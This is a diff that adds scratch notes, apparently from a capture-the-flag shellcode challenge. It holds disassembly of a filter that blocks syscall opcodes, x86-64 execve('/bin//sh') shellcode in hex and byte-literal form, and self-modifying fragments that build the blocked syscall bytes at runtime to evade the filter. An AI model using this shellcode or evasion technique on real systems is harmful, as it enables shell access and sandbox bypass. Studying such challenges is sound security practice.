@@ -1,0 +1,83 @@
+000402010 unk_402010      db  0Fh                 ; DATA XREF: filter+13↑o
+.rodata:0000000000402011                 db    5
+.rodata:0000000000402012                 db    0
+.rodata:0000000000402013 unk_402013      db  0Fh                 ; DATA XREF: filter+1B↑o
+.rodata:0000000000402014                 db  34h ; 4
+.rodata:0000000000402015                 db    0
+.rodata:0000000000402016 unk_402016      db 0CDh                 ; DATA XREF: filter+23↑o
+.rodata:0000000000402017                 db  80h
+.rodata:0000000000402018                 db    0
+
+0f 5
+0f 34
+cd 80
+
+\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x90\x05
+
+
+
+
+                48 bf 41 41 41 41 41    mov $rdi, 0x4141414141414141
+  401007:       41 41 41
+  40100a:       b8 3b 00 00 00          mov    $eax , 0x3b
+  40100f:       48 31 f6                xor    $rsi, $rsi
+  401012:       48 31 d2                xor    $rdx, $rdx
+  401015:       0f 05
+  
+ 
+48 bf 41 41 41 41 41 41 41 41
+\x48\xbf\x02\x1d\x13\x37\x13\x00\x00\x00\x48\xc7\x07\x00\x00\x05\x0f
+\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\xb8\x3b\x00\x00\x00\x48\x31\xf6\x48\x31\xd2
+
+  401000:       48 bf 00 20 40 00 00    movabs rdi,0x402000
+  401007:       00 00 00
+  40100a:       48 c7 07 2c 20 57 6f    mov    QWORD PTR [rdi],0x6f57202c
+  401011:       b8 3c 00 00 00          mov    eax,0x3c
+  401016:       31 ff                   xor    edi,edi
+  401018:       0f 05                   syscall
+
+  40100a:       b8 00 00 04 0f          mov    eax,0xf040000
+  40100f:       48 05 00 00 01 00       add    rax,0x10000
+  401015:       48 89 07                mov    QWORD PTR [rdi],rax
+
+'0x1337131035'
+
+ b"\x48\xbf\x69\x69\x69\x69\x69\x00\x00\x00"
+b"\x48\xc7\x07\x2f\x62\x69\x6e"
+b"\x48\xbf\x6d\x69\x69\x69\x69\x00\x00\x00"
+b"\x48\xc7\x07\x2f\x73\x68\x00"
+0x1337131369 + 2457
+0x133713102d
+0e05
+0x1337131992
+0x1337131026
+mov rax, 0x000000000000050f
+
+\x48\xbf\x02\x1d\x13\x37\x13  
+\xb8\x0f\x04\x00\x00\x48\x05\x00\x01\x00\x00\x48\x89\x07
+
+\x0f\x04\x00\x00
+\x01\x00\x00
+0x0f040000
+\x48\xbf\x02\x1d\x13\x37\x13\x00\x00\x00\x48\xc7\x07\x00\x00\x05\x0f
+
+
+hex(0x7fff9c0ef868-0x7fff9c0ef8d8+4)
+-0x6c
+
+sub r13, 0x6c
+mov qword [r13] , 0
+add r13, 4
+mov rbx, [r13]
+add rbx , 0x69696969
+jmp rbx
+
+0000000000401000 <_start>:
+  401000:       49 83 ed 6c             sub    r13,0x6c
+  401004:       49 c7 45 00 00 00 00    mov    QWORD PTR [r13+0x0],0x0
+  40100b:       00
+  40100c:       49 83 c5 04             add    r13,0x4
+  401010:       49 8b 5d 00             mov    rbx,QWORD PTR [r13+0x0]
+  401014:       48 81 c3 69 69 69 69    add    rbx,0x69696969
+  40101b:       ff e3                   jmp    rbx
+
